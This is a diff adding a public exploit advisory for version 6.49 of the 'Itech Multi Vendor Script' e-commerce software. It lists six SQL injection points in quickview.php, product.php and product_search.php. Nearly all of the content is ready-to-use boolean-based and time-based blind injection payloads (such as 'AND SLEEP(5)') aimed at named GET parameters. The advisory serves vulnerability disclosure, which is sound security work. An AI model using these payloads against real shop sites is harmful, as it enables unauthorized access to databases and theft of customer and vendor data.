@@ -1,0 +1,77 @@
+# Exploit Title :  Itech Multi Vendor Script - Multiple SQL Injections
+# Author 		:  Yunus YILDIRIM (Th3GundY)
+# Team 			:  CT-Zer0 (@CRYPTTECH) - https://www.crypttech.com
+# Website 		:  http://www.yunus.ninja
+# Contact 		:  yunusyildirim@protonmail.com
+
+# Vendor Homepage : http://itechscripts.com/
+# Software Link   : http://itechscripts.com/multi-vendor-shopping-script/
+# Vuln. Version	  : 6.49
+# Demo			  : http://multi-vendor.itechscripts.com
+
+
+# # # #  DETAILS  # # # # 
+
+SQL Injections :
+
+# 1
+http://localhost/quickview.php?id=10
+	Parameter: id (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: id=10 AND 9776=9776
+
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind
+	    Payload: id=10 AND SLEEP(5)
+
+# 2
+http://localhost/product.php?id=9
+	Parameter: id (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: id=9 AND 9693=9693
+
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind
+	    Payload: id=9 AND SLEEP(5)
+
+# 3
+http://localhost/product_search.php?search=Adidas
+	Parameter: search (GET)
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind
+	    Payload: search=Adidas%' AND SLEEP(5) AND '%'='
+
+# 4
+http://localhost/product_search.php?category_id=1
+	Parameter: category_id (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: category_id=1 AND 8225=8225
+
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind
+	    Payload: category_id=1 AND SLEEP(5)
+
+# 5
+http://localhost/product_search.php?category_id=1&sub_category_id=1&sub_sub_category_id=1
+	Parameter: sub_sub_category_id (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: category_id=1&sub_category_id=1&sub_sub_category_id=1 AND 7485=7485
+
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind
+	    Payload: category_id=1&sub_category_id=1&sub_sub_category_id=1 AND SLEEP(5)
+
+# 6
+http://localhost/product_search.php?category_id=1&sub_category_id=1
+	Parameter: sub_category_id (GET)
+	    Type: boolean-based blind
+	    Title: AND boolean-based blind - WHERE or HAVING clause
+	    Payload: category_id=1&sub_category_id=1 AND 5242=5242
+
+	    Type: AND/OR time-based blind
+	    Title: MySQL >= 5.0.12 AND time-based blind
+	    Payload: category_id=1&sub_category_id=1 AND SLEEP(5)
